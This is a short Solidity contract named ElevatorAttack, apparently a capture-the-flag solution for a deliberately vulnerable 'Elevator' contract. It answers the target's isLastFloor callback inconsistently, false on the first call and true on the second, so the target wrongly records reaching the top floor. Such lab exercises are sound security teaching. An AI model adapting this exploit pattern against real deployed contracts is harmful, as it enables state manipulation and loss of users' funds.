// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

interface Elevator {
    function goTo(uint256) external;
}

contract ElevatorAttack {
    Elevator elevator;
    bool firstTime;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function attack() public {
        elevator.goTo(0);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (firstTime == false) {
            firstTime = true;
            return false;
        }
        return true;
    }
}
